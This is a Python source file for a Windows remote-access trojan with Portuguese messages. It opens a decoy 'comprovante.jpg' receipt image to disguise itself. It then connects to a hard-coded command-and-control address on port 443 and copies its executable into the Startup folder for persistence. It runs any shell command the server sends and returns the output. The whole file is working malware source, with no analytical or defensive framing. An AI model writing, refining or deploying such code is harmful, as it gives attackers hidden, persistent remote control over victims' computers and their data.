import socket
import os
import subprocess
import sys
import time
import threading

CCIP = "192.168.1.128"
CCPORT = 443

runfile = sys._MEIPASS + "\comprovante.jpg"
subprocess.Popen(runfile, shell=True)


def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        print(client)
        autorun()
        return client
    except socket.timeout:
        print(f"Conexão com {CCIP}:{CCPORT} expirou.")
    except Exception as error:
        print(f"Erro ao conectar: {error}")
    return None

def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))


def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        print(output)
        if(output):
            client.send(output)
        else:
            client.send("Opa algo deu errado")
    except Exception as error:
        print(error)

def checkConn(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        client.close()

if __name__ == "__main__":
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            checkConn(client)
        else:
            time.sleep(1)




